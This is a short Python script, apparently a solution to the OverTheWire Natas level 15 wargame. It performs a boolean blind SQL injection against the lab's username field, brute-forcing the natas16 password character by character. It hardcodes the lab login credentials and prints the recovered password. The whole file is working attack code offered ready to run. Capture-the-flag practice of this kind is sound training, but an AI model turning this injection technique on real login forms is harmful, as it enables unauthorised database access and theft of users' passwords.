import requests
from string import ascii_letters, digits

log_user = "natas15"
log_pass = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
URL = "http://{}:{}@natas15.natas.labs.overthewire.org".format(log_user, log_pass)

def getPossiblechars():
    return ascii_letters + digits

def makerequest(partialpass):
    injection = 'natas16" and password like binary "{}%"#'.format(partialpass)
    r = requests.post(URL, data={"username": injection})
    return r


def verifypass(partialpass):
    response = makerequest(partialpass)
    if "This user exists" in response.text:
        return True
    else:
        return False

def discoverchar(partialPassword):
    for c in getPossiblechars():
        contains = verifypass(partialPassword + c)
        if contains:
            return c
    return None


partialPassword = ""
nonone = True
while nonone:
    nonone = discoverchar(partialPassword)
    if nonone == None:
        print("Final: " + partialPassword)
    else:
        partialPassword += nonone
        print("De moment: " + partialPassword)

print("My password was: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")